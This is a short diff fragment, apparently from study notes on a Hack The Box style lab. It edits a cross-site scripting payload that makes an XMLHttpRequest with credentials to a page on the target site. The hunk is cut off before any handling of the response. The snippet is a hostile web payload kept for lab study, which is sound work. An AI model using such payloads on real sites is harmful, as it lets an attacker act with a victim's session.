@@ -108,7 +108,7 @@ then xss=>
 or via the server on the script 
 <script>
 var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://xssintro.htb/admin.php', false);
+xhr.open('GET', 'https://vulnerablesite.htb/home.php', false);
 xhr.withCredentials = true;
 xhr.send();
 
